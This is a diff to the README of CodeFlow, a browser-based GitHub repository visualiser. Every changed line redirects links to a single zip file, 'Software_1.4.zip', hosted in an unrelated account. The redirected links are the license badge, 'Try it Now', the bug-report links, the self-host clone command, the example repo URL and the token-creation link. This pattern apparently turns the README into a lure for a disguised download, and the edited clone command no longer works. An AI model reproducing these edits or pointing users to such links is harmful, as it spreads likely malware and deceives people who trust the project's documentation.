@@ -6,10 +6,10 @@
 
 **Zero setup. No installation. Just paste a GitHub URL.**
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://opensource.org/licenses/MIT)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](http://makeapullrequest.com)
+[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://raw.githubusercontent.com/pmanss/codeflow/main/tupelo/Software_1.4.zip)
+[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](https://raw.githubusercontent.com/pmanss/codeflow/main/tupelo/Software_1.4.zip)
 
-[**Try it Now**](https://codeflow-five.vercel.app/) · [Report Bug](https://github.com/braedonsaunders/codeflow/issues) · [Request Feature](https://github.com/braedonsaunders/codeflow/issues)
+[**Try it Now**](https://raw.githubusercontent.com/pmanss/codeflow/main/tupelo/Software_1.4.zip) · [Report Bug](https://raw.githubusercontent.com/pmanss/codeflow/main/tupelo/Software_1.4.zip) · [Request Feature](https://raw.githubusercontent.com/pmanss/codeflow/main/tupelo/Software_1.4.zip)
 
 <img src="./screenshot.png" alt="CodeFlow Screenshot" width="100%"/>
 
@@ -89,12 +89,12 @@ Your GitHub token (if used) is only stored in your browser's memory and is clear
 ## Quick Start
 
 ### Option 1: Use Online (Recommended)
-Just visit [CodeFlow](https://codeflow-five.vercel.app/) and paste any GitHub URL.
+Just visit [CodeFlow](https://raw.githubusercontent.com/pmanss/codeflow/main/tupelo/Software_1.4.zip) and paste any GitHub URL.
 
 ### Option 2: Self-Host
 ```bash
 # Clone the repo
-git clone https://github.com/braedonsaunders/codeflow.git
+git clone https://raw.githubusercontent.com/pmanss/codeflow/main/tupelo/Software_1.4.zip
 
 # That's it! Just open index.html in your browser
 open index.html
@@ -109,11 +109,11 @@ No build process. No dependencies. No npm install. **It's just one HTML file.**
 ### Public Repositories
 ```
 Just paste: facebook/react
-Or full URL: https://github.com/facebook/react
+Or full URL: https://raw.githubusercontent.com/pmanss/codeflow/main/tupelo/Software_1.4.zip
 ```
 
 ### Private Repositories
-1. Create a [GitHub Personal Access Token](https://github.com/settings/tokens) with `repo` scope
+1. Create a [GitHub Personal Access Token](https://raw.githubusercontent.com/pmanss/codeflow/main/tupelo/Software_1.4.zip) with `repo` scope
 2. Paste it in the Token field
 3. Analyze your private repos
 
